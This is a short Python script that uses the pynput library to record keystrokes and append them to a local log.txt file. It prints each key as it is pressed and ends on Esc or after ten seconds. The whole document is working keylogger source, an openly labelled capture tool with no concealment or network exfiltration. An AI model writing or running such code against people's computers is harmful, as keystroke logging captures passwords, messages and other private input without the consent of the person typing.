from typing import List

from pynput.keyboard import Key, Listener


char_count = 0
saved_keys = []

def on_key_press(key: str):

   try:
       print("Key Pressed: ", key)
   except Exception as ex:
       print("There was an error: ", ex)
def on_key_release(key):
   global saved_keys, char_count

   if key == Key.esc:
       return False
   else:
       if key == Key.enter:
           write_to_file(saved_keys)
           char_count = 0
           saved_keys = []


       elif key == Key.space:
           # If Space key is pressed, treat it as a separator
           key = " "  # Replace with actual space character


           write_to_file(saved_keys)  # Save recorded keys
           saved_keys = []  # Reset saved keys
           char_count = 0  # Reset character count


       saved_keys.append(key)  # Add the pressed key to the list
       char_count += 1  # Increment character count




def write_to_file(keys: List[str]):

   with open("log.txt", "a") as file:  # Open the log file in append mode
       for key in keys:
           key = str(key).replace("'", "")  # Remove single quotes


           if "key".upper() not in key.upper():

               file.write(key)  
       file.write("\n")
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
   print("Start key logging...")
   listener.join(10)
   print("End key logging...")